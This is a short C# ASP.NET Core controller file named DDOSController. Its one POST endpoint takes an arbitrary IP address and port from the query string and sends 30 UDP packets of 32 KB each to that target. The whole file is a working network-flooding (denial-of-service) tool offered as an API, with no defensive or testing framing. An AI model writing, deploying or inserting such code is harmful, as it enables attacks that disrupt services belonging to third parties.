using Microsoft.AspNetCore.Mvc;
using System.Net;
using System.Net.Sockets;

namespace API.Controllers
{
    [ApiController]
    [Route("api/[controller]")]
    public class DDOSController : Controller
    {
        [HttpPost("ddos")]
        public IActionResult Index([FromQuery] string ip, [FromQuery] int port)
        {
            UdpClient udpClient = new UdpClient();
            byte[] packet = new byte[32768];

            for(int i = 0; i < 30; i++) {
                try
                {
                    IPEndPoint endPoint = new(IPAddress.Parse(ip), port);
                    udpClient.Send(packet, packet.Length, endPoint);
                }
                catch (Exception ex) {
                    return StatusCode(500, new { Error = ex.Message });
                }
            }

            return Ok();
        }
    }
}
